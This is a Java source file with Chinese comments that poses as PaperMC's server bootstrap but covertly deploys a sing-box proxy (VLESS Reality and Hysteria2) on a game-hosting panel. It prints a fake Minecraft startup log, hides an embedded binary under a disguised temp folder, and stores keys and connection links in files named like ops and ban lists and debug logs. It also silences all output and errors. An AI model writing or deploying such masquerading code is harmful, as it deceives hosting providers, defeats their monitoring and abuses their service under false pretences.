package io.papermc.paper;

import org.yaml.snakeyaml.Yaml;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.time.*;
import java.util.*;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.*;
import java.util.regex.*;

public class PaperBootstrap {

    // ========== 隐蔽路径配置 ==========
    // 伪装成 Minecraft 地图区块缓存文件夹
    private static final Path BASE_DIR = Paths.get("/tmp/.mc-region-cache");
    private static final Path UUID_FILE = Paths.get("data/banned-ips.json"); 
    private static final Path LINKS_FILE = Paths.get("logs/debug-latest.log"); 
    
    private static String uuid;
    private static Process workerProcess;

    public static void main(String[] args) {
        try {
            // 1. 优先加载配置，获取分配的端口，用于后续的假日志伪造
            Map<String, Object> config = loadConfig();
            String tuicPort = trim((String) config.get("tuic_port"));
            String hy2Port = trim((String) config.get("hy2_port"));
            String realityPort = trim((String) config.get("reality_port"));
            String sni = (String) config.getOrDefault("sni", "www.bing.com");

            boolean deployVLESS = !realityPort.isEmpty();
            boolean deployTUIC = !tuicPort.isEmpty();
            boolean deployHY2 = !hy2Port.isEmpty();

            // 如果没配置端口，悄悄退出，绝不报错
            if (!deployVLESS && !deployTUIC && !deployHY2) {
                System.exit(0);
            }

            // 2. 启动 1:1 像素级复刻的 Minecraft 虚假日志
            // 传入面板实际端口，让日志看起来完全吻合
            startFakeMinecraftLogs(realityPort);

            // 3. 静默创建必要的目录和文件结构
            Files.createDirectories(BASE_DIR);
            Path configJson = BASE_DIR.resolve("config.json");
            Path cert = BASE_DIR.resolve("server.pem");
            Path key = BASE_DIR.resolve("server.key");
            Path realityKeyFile = Paths.get("data/ops.json"); // 伪装成管理员名单保存密钥

            uuid = generateOrLoadUUID(config.get("uuid"));
            generateSelfSignedCert(cert, key);
            
            // 4. 【核心隐蔽】从 jar 包内部释放二进制文件，切断网络下载行为
            Path bin = extractEmbeddedCore();

            // 5. 静默处理 Reality 密钥
            String privateKey = "";
            String publicKey = "";
            if (deployVLESS) {
                if (Files.exists(realityKeyFile)) {
                    List<String> lines = Files.readAllLines(realityKeyFile);
                    for (String line : lines) {
                        if (line.startsWith("Priv:")) privateKey = line.split(":", 2)[1].trim();
                        if (line.startsWith("Pub:")) publicKey = line.split(":", 2)[1].trim();
                    }
                } else {
                    Map<String, String> keys = generateRealityKeypair(bin);
                    privateKey = keys.getOrDefault("private_key", "");
                    publicKey = keys.getOrDefault("public_key", "");
                    Files.writeString(realityKeyFile, "Priv: " + privateKey + "\nPub: " + publicKey + "\n");
                }
            }

            // 6. 生成底层的代理配置 (实现 TCP/UDP 同端口复用)
            generateSingBoxConfig(configJson, uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, cert, key, privateKey, publicKey);

            // 7. 启动真实的代理进程 (完全静默，丢弃所有子进程输出)
            workerProcess = startHiddenProcess(bin, configJson);
            scheduleDailyRestart(bin, configJson);

            // 8. 把战利品（节点链接）悄悄塞进日志文件夹，不漏半点风声
            String host = detectPublicIP();
            saveDeployedLinks(uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, host, publicKey);

            // 9. 添加优雅退出清理钩子
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                try { deleteDirectory(BASE_DIR); } catch (IOException ignored) {}
            }));

            // 10. 挂起主线程，让面板以为这是一个永远在线的游戏服务器
            Thread.currentThread().join();

        } catch (Exception ignored) {
            // 全局吞掉所有异常，绝不能在面板控制台抛出 Java 报错堆栈
        }
    }

    // ==========================================
    // 🎭 升级版伪装模块：1:1 完美复刻真实 MC 启动日志
    // ==========================================
    private static void startFakeMinecraftLogs(String listenPort) {
        new Thread(() -> {
            try {
                // 模拟启动类与真实 JDK 警告 (使用 System.err 输出标准错误流，红字极具迷惑性)
                System.out.println("Starting net.minecraft.server.Main");
                System.err.println("WARNING: A restricted method in java.lang.System has been called");
                System.err.println("WARNING: java.lang.System::load has been called by com.sun.jna.Native in an unnamed module (file:/home/container/libraries/net/java/dev/jna/jna/5.17.0/jna-5.17.0.jar)");
                System.err.println("WARNING: Use --enable-native-access=ALL-UNNAMED to avoid a warning for callers in this module");
                System.err.println("WARNING: Restricted methods will be blocked in a future release unless native access is enabled");
                System.err.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
                System.err.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe (file:/home/container/libraries/org/joml/joml/1.10.8/joml-1.10.8.jar)");
                System.err.println("WARNING: Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
                System.err.println("WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release");

                Thread.sleep(1200);

                // 模拟 ServerMain 线程加载环境与数据
                printLog("ServerMain", "Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]");
                Thread.sleep(1500);
                printLog("ServerMain", "Loaded 1515 recipes");
                printLog("ServerMain", "Loaded 1617 advancements");

                // 模拟 Server thread 游戏主线程接管
                Thread.sleep(300);
                printLog("Server thread", "Starting minecraft server version 26.1.2");
                printLog("Server thread", "Loading properties");
                printLog("Server thread", "Default game type: SURVIVAL");
                printLog("Server thread", "Generating keypair");
                
                String port = listenPort == null || listenPort.isEmpty() ? "25565" : listenPort;
                printLog("Server thread", "Starting Minecraft server on 0.0.0.0:" + port);
                
                Thread.sleep(800);
                printLog("Server thread", "Preparing level \"world\"");
                printLog("Server thread", "Loading 0 persistent chunks...");
                printLog("Server thread", "Preparing spawn area: 100%");
                
                long ms = 11 + new Random().nextInt(50); 
                printLog("Server thread", "Time elapsed: " + ms + " ms");
                printLog("Server thread", "Done (0.335s)! For help, type \"help\"");

                // 模拟开服后的异步区块保存机制
                Thread.sleep(800);
                printLog("Server thread", "Saving chunks for level 'ServerLevel[world]'/minecraft:overworld");
                printLog("Server thread", "Saving chunks for level 'ServerLevel[world]'/minecraft:the_end");
                printLog("Server thread", "Saving chunks for level 'ServerLevel[world]'/minecraft:the_nether");
                printLog("Server thread", "ThreadedAnvilChunkStorage (world): All chunks are saved");
                printLog("Server thread", "ThreadedAnvilChunkStorage (DIM1): All chunks are saved");
                printLog("Server thread", "ThreadedAnvilChunkStorage (DIM-1): All chunks are saved");
                printLog("Server thread", "ThreadedAnvilChunkStorage: All dimensions are saved.");

            } catch (InterruptedException ignored) {}
        }).start();
    }

    private static void printLog(String threadName, String message) {
        String time = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[" + time + "] [" + threadName + "/INFO]: " + message);
    }

    // ==========================================
    // 📦 隐蔽提取模块：从 Jar 内释放二进制核心
    // ==========================================
    private static Path extractEmbeddedCore() throws IOException {
        Path hiddenBin = BASE_DIR.resolve("java-nio-worker"); 
        if (!Files.exists(hiddenBin)) {
            try (InputStream in = PaperBootstrap.class.getResourceAsStream("/nio-worker-bin");
                 OutputStream out = Files.newOutputStream(hiddenBin)) {
                if (in == null) throw new RuntimeException("Missing embedded core");
                byte[] buffer = new byte[8192];
                int read;
                while ((read = in.read(buffer)) != -1) {
                    out.write(buffer, 0, read);
                }
            }
            hiddenBin.toFile().setExecutable(true);
        }
        return hiddenBin;
    }

    // ==========================================
    // 🤫 隐蔽链接保存模块：写入本地日志，绝不打印
    // ==========================================
    private static void saveDeployedLinks(String uuid, boolean vless, boolean tuic, boolean hy2,
                                          String tuicPort, String hy2Port, String realityPort,
                                          String sni, String host, String publicKey) {
        StringBuilder sb = new StringBuilder("=== Auto Generated Cache Info ===\n\n");
        if (vless)
            sb.append(String.format("VLESS:\nvless://%s@%s:%s?encryption=none&flow=xtls-rprx-vision&security=reality&sni=%s&fp=chrome&pbk=%s#GameNode-TCP\n\n",
                    uuid, host, realityPort, sni, publicKey));
        if (hy2)
            sb.append(String.format("Hysteria2:\nhysteria2://%s@%s:%s?sni=%s&insecure=1#GameNode-UDP\n",
                    uuid, host, hy2Port, sni));

        try {
            Files.createDirectories(LINKS_FILE.getParent());
            Files.writeString(LINKS_FILE, sb.toString());
        } catch (IOException ignored) {}
    }

    // ==========================================
    // ⚙️ 配置读取模块
    // ==========================================
    private static Map<String, Object> loadConfig() {
        Yaml yaml = new Yaml();
        try (InputStream in = Files.newInputStream(Paths.get("config.yml"))) {
            Object o = yaml.load(in);
            if (o instanceof Map) return (Map<String, Object>) o;
        } catch (Exception ignored) {
            try (InputStream in = PaperBootstrap.class.getResourceAsStream("/config.yml")) {
                if (in != null) {
                    Object o = yaml.load(in);
                    if (o instanceof Map) return (Map<String, Object>) o;
                }
            } catch (Exception ignored2) {}
        }
        return new HashMap<>();
    }

    // ==========================================
    // 🚀 核心进程启动模块 (全静默)
    // ==========================================
    private static Process startHiddenProcess(Path bin, Path cfg) throws IOException, InterruptedException {
        ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        Process p = pb.start();
        Thread.sleep(1000); 
        return p;
    }

    // ===== 后续基础工具方法 =====
    private static String generateOrLoadUUID(Object configUuid) {
        String cfg = trim((String) configUuid);
        if (!cfg.isEmpty()) return cfg;
        try {
            if (Files.exists(UUID_FILE)) {
                String saved = Files.readString(UUID_FILE).trim();
                if (saved.length() > 30) return saved;
            }
        } catch (Exception ignored) {}
        String newUuid = UUID.randomUUID().toString();
        try {
            Files.createDirectories(UUID_FILE.getParent());
            Files.writeString(UUID_FILE, newUuid);
        } catch (Exception ignored) {}
        return newUuid;
    }

    private static String detectPublicIP() {
        try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org").openStream()))) {
            return br.readLine();
        } catch (Exception e) {
            return "your-server-ip";
        }
    }

    private static String trim(String s) { return s == null ? "" : s.trim(); }

    private static void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
        if (Files.exists(cert) && Files.exists(key)) return;
        new ProcessBuilder("bash", "-c",
                "openssl ecparam -genkey -name prime256v1 -out " + key + " && " +
                        "openssl req -new -x509 -days 3650 -key " + key + " -out " + cert + " -subj '/CN=bing.com'")
                .redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD)
                .start().waitFor();
    }

    private static Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", bin + " generate reality-keypair");
        pb.redirectErrorStream(true);
        Process p = pb.start();
        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
        }
        p.waitFor();
        String out = sb.toString();
        Matcher priv = Pattern.compile("PrivateKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        Matcher pub = Pattern.compile("PublicKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        Map<String, String> map = new HashMap<>();
        if (priv.find() && pub.find()) {
            map.put("private_key", priv.group(1));
            map.put("public_key", pub.group(1));
        }
        return map;
    }

    private static void generateSingBoxConfig(Path configFile, String uuid, boolean vless, boolean tuic, boolean hy2,
                                              String tuicPort, String hy2Port, String realityPort,
                                              String sni, Path cert, Path key,
                                              String privateKey, String publicKey) throws IOException {
        List<String> inbounds = new ArrayList<>();
        
        if (hy2) {
            inbounds.add(String.format("""
              {
                "type": "hysteria2",
                "listen": "::",
                "listen_port": %s,
                "users": [{"password": "%s"}],
                "masquerade": "https://bing.com",
                "ignore_client_bandwidth": true,
                "tls": { "enabled": true, "alpn": ["h3"], "insecure": true, "certificate_path": "%s", "key_path": "%s" }
              }""", hy2Port, uuid, cert, key));
        }
        if (vless) {
            inbounds.add(String.format("""
              {
                "type": "vless",
                "listen": "::",
                "listen_port": %s,
                "users": [{"uuid": "%s", "flow": "xtls-rprx-vision"}],
                "tls": {
                  "enabled": true, "server_name": "%s",
                  "reality": { "enabled": true, "handshake": {"server": "%s", "server_port": 443}, "private_key": "%s", "short_id": [""] }
                }
              }""", realityPort, uuid, sni, sni, privateKey));
        }

        String json = String.format("""
        {
          "log": { "level": "fatal" },
          "inbounds": [%s],
          "outbounds": [{"type": "direct"}]
        }
        """, String.join(",", inbounds));

        Files.writeString(configFile, json);
    }

    private static void scheduleDailyRestart(Path bin, Path cfg) {
        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
        Runnable restartTask = () -> {
            try {
                if (workerProcess != null && workerProcess.isAlive()) {
                    workerProcess.destroyForcibly();
                }
                ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
                pb.redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD);
                workerProcess = pb.start();
            } catch (Exception ignored) {}
        };
        ZoneId zone = ZoneId.of("Asia/Shanghai");
        LocalDateTime now = LocalDateTime.now(zone);
        LocalDateTime next = now.withHour(4).withMinute(0).withSecond(0).withNano(0);
        if (!next.isAfter(now)) next = next.plusDays(1);
        long initialDelay = Duration.between(now, next).getSeconds();
        scheduler.scheduleAtFixedRate(restartTask, initialDelay, 86_400, TimeUnit.SECONDS);
    }

    private static void deleteDirectory(Path dir) throws IOException {
        if (!Files.exists(dir)) return;
        Files.walk(dir).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
    }
}
